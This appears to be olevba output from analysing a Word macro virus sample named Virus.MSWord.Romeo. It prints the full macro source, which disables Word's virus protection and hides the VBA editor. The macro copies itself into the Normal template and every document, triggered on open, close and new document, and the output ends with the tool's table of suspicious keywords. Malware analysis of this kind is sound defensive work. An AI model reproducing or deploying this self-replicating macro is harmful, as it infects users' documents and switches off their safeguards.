olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Romeo
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Romeo - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Anti-Virus for & ROMEO'
'Anti_Virus'
On Error GoTo kones

 With Options
    .VirusProtection = False
 End With
ShowVisualBasicEditor = False
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    If .Lines(3, 1) <> "'Anti_Virus'" Then
        .DeleteLines 1, .CountOfLines
    End If
    If .CountOfLines = 0 Then
        .InsertLines 1, ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _
        ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
    End If
End With
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    If .Lines(3, 1) <> "'Anti-Virus'" Then
        .DeleteLines 1, .CountOfLines
End If
If .CountOfLines = 0 Then
    .InsertLines 1, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, _
    NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)
End If
End With
NormalTemplate.Save
ActiveDocument.Save
kones:
End Sub
Private Sub Document_Close()
Document_Open
End Sub
Private Sub Document_New()
Document_Open
End Sub

































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

